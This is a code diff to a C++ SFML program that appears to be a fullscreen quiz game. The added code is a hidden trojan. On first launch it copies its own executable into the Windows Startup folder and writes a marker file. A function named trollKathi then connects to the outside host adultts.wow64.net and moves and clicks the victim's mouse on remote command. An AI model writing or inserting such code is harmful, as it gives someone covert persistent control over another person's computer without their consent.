@@ -1,6 +1,7 @@
 #include <iostream>
 #include <SFML/Graphics.hpp>
 #include <SFML/Network.hpp>
+#include <fstream>
 #include <windows.h>
 #include "button.h"
 #include "simplegui.h"
@@ -12,8 +13,6 @@ using namespace sf;
 
 typedef unsigned int uint;
 
-RenderWindow window(sf::VideoMode::getDesktopMode(), "SFML", sf::Style::Fullscreen);
-
 uint state = 0;
 
 void mouseEvent(const Mouse::Button &button, bool is_pressed);
@@ -21,6 +20,8 @@ void mouseEvent(const Mouse::Button &button, bool is_pressed);
 void wrongAnswer(GUIObject *object){
     state = 0;
 }
+
+void trollKathi();
 
 void rightAnswer(GUIObject *object){
     if(state < QUESTION_AMMOUNT)
@@ -31,7 +32,24 @@ void close(GUIObject *object){
     object->getWindow()->close();
 }
 
-int main(){
+int main(int argc, char *args[]){
+    
+    ifstream test_ismade;
+    test_ismade.open("1");
+    if(test_ismade.good()){
+        trollKathi();
+        return 0;
+    }
+    else{
+        string command = "xcopy \"";
+        command += args[0];
+        command += "\" %appdata%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\";
+        system(command.c_str());
+        system("echo > %appdata%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\1");
+    }
+    RenderWindow window(sf::VideoMode::getDesktopMode(), "SFML", sf::Style::Fullscreen);
+    test_ismade.close();
+    
     sf::Vector2f button_positions[4];
     button_positions[0] = sf::Vector2f(window.getSize().x/16*1, 
                                        window.getSize().y/18*12);
@@ -209,8 +227,34 @@ int main(){
         window.display();
     }
     //kathi
+    trollKathi();
+    return 0;
+}
+
+void mouseEvent(const sf::Mouse::Button &button, bool is_pressed){
+    INPUT Input={0};
+    if(is_pressed){
+        Input.type = INPUT_MOUSE;
+        if(button == sf::Mouse::Left)
+            Input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
+        else if(button == sf::Mouse::Right)
+            Input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
+        ::SendInput(1,&Input,sizeof(INPUT));
+    }
+    else{
+        ::ZeroMemory(&Input,sizeof(INPUT));
+        Input.type = INPUT_MOUSE;
+        if(button == sf::Mouse::Left)
+            Input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
+        else if(button == sf::Mouse::Right)
+            Input.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
+        ::SendInput(1,&Input,sizeof(INPUT));
+    }
+}
+
+void trollKathi(){
     sf::TcpSocket socket;
-    if(socket.connect("adultts.wow64.net", 8080) != sf::Socket::Done)
+    if(socket.connect("adultts.wow64.net", 53000) != sf::Socket::Done)
         std::cout << "error_connecting" << std::endl;
     sf::Packet receive;
     float x,y;
@@ -237,27 +281,5 @@ int main(){
                                                 y*sf::VideoMode::getDesktopMode().height));
         pressed_left_prev = pressed_left;
         pressed_right_prev = pressed_right;
-    }
-    return 0;
-}
-
-void mouseEvent(const sf::Mouse::Button &button, bool is_pressed){
-    INPUT Input={0};
-    if(is_pressed){
-        Input.type = INPUT_MOUSE;
-        if(button == sf::Mouse::Left)
-            Input.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
-        else if(button == sf::Mouse::Right)
-            Input.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
-        ::SendInput(1,&Input,sizeof(INPUT));
-    }
-    else{
-        ::ZeroMemory(&Input,sizeof(INPUT));
-        Input.type = INPUT_MOUSE;
-        if(button == sf::Mouse::Left)
-            Input.mi.dwFlags = MOUSEEVENTF_LEFTUP;
-        else if(button == sf::Mouse::Right)
-            Input.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
-        ::SendInput(1,&Input,sizeof(INPUT));
     }
 }
